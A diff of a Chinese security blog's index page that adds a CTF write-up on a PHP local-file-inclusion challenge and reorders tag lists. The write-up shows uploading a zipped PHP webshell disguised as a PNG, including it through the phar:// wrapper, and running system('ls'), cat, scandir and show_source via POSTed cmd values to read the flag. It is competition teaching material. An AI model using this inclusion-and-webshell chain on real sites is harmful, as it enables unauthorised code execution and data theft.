@@ -78,6 +78,85 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/2018/08/15/中孚杯铜牌LFI/" title="中孚杯铜牌 LFI" itemprop="url">中孚杯铜牌 LFI</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
+		
+  <p class="article-time">
+    <time datetime="2018-08-15T14:00:03.000Z" itemprop="datePublished"> Published 2018-08-15</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>当时这道题并没有做出来，也并没有意识到会是文件包含，去年参加比赛的时候，太萌新了，机缘巧合遇到出题人才想起来再次去看这道题。</p>
+<p>考点为php伪协议文件包含<br><--more--></--more--></p>
+<p>首先点击上传文件，上传后发现，url变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://40.125.170.89:8007/index.php?poj=show&amp;imageid=925cb008b81193fb099183c40091de07677ac5c6</span><br></pre></td></tr></table></figure>
+<p>尝试将show替换为index，发现被成功包含执行，判定此处存在文件包含漏洞，但是拼接了<code>.php</code></p>
+<p>此时采用<code>phar</code>协议或者<code>zip</code>协议绕过</p>
+<p>然后将一句话木马压缩成zip格式的压缩包，然后将拓展名改为png，上传，并使用phar协议执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://40.125.170.89:8007/index.php?poj=phar://uploads/775edc76cc887daa1b6c3423c33f7aa3d1ac76db.png/a</span><br></pre></td></tr></table></figure>
+<p>尝试<code>system</code>发现可以使用，于是直接POST传值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+<p>列出当前目录，发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">css function.php index.php show.php tHe_flAg_1s_Here.php upload.php uploads</span><br></pre></td></tr></table></figure>
+<p>直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;cat tHe_flAg_1s_Here.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>右击查看源代码即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag is here</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;yjnfrtgertyhrtyjnbvf1sn0Tifbgt&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>如果<code>system</code>函数被禁用，则可以尝试<code>scandir</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=print_r(scandir(&quot;.&quot;));//列出当前目录下的所有文件</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; css [3] =&gt; function.php [4] =&gt; index.php [5] =&gt; show.php [6] =&gt; tHe_flAg_1s_Here.php [7] =&gt; upload.php [8] =&gt; uploads )</span><br></pre></td></tr></table></figure>
+<p>使用<code>show_source</code>函数，查看文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=show_source(&apos;tHe_flAg_1s_Here.php&apos;);</span><br></pre></td></tr></table></figure>
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/中孚杯/">中孚杯</a><a href="/tags/山东省大学生信息安全竞赛/">山东省大学生信息安全竞赛</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/2018/08/12/xman2018个人排位赛Web-MISCWriteup/" title="Xman2018排位赛 Web、MISC Writeup" itemprop="url">Xman2018排位赛 Web、MISC Writeup</a>
   </h1>
   <p class="article-author">By
@@ -538,7 +617,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/python/">python</a><a href="/tags/自动化/">自动化</a><a href="/tags/selenium/">selenium</a>
+  <span></span> <a href="/tags/python/">python</a><a href="/tags/selenium/">selenium</a><a href="/tags/自动化/">自动化</a>
   </div>
 
 </div>
@@ -599,75 +678,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/综合渗透/">综合渗透</a><a href="/tags/铁人三项/">铁人三项</a><a href="/tags/Writeup/">Writeup</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/03/19/综合渗透/" title="综合渗透笔记 (持续更新)" itemprop="url">综合渗透笔记 (持续更新)</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
-		
-  <p class="article-time">
-    <time datetime="2018-03-19T08:00:03.000Z" itemprop="datePublished"> Published 2018-03-19</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>最近学校组织参加西普杯 铁人三项比赛，很久没搞渗透，重新把这一块给拾起来</p>
-<p>西普杯铁人三项包括</p>
-<ul>
-<li>个人环境竞赛(pwn)</li>
-<li>企业环境竞赛(综合渗透)</li>
-<li>数据分析对抗(wireshark流量分析)</li>
-</ul>
-<p>对其他两项涉足比较少，所以打算在综合渗透上深挖<br>
-        
-        
-        <p class="article-more-link">
-          
-            <a href="/2018/03/19/综合渗透/#more">Read More</a>
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
-</div>
-
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/综合渗透/">综合渗透</a><a href="/tags/铁人三项/">铁人三项</a>
+  <span></span> <a href="/tags/铁人三项/">铁人三项</a><a href="/tags/综合渗透/">综合渗透</a><a href="/tags/Writeup/">Writeup</a>
   </div>
 
 </div>
@@ -707,7 +718,7 @@
 		<ul>
 		
 		  
-			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>7</sup></a></li>
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>8</sup></a></li>
 		  
 		
 		  
@@ -740,11 +751,11 @@
 			
 		
 			
-				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
 			
 		
 			
@@ -752,11 +763,11 @@
 			
 		
 			
-				<li><a href="/tags/TensorFlow/" title="TensorFlow">TensorFlow<sup>1</sup></a></li>
+				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/图像识别/" title="图像识别">图像识别<sup>1</sup></a></li>
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>1</sup></a></li>
 			
 		
 			
@@ -772,15 +783,11 @@
 			
 		
 			
+				<li><a href="/tags/selenium/" title="selenium">selenium<sup>1</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/笔记/" title="笔记">笔记<sup>1</sup></a></li>
 			
 		
 			
@@ -792,15 +799,19 @@
 			
 		
 			
-				<li><a href="/tags/selenium/" title="selenium">selenium<sup>1</sup></a></li>
+				<li><a href="/tags/TensorFlow/" title="TensorFlow">TensorFlow<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
+				<li><a href="/tags/图像识别/" title="图像识别">图像识别<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/培训总结/" title="培训总结">培训总结<sup>1</sup></a></li>
+				<li><a href="/tags/中孚杯/" title="中孚杯">中孚杯<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/山东省大学生信息安全竞赛/" title="山东省大学生信息安全竞赛">山东省大学生信息安全竞赛<sup>1</sup></a></li>
 			
 		
 		</ul>
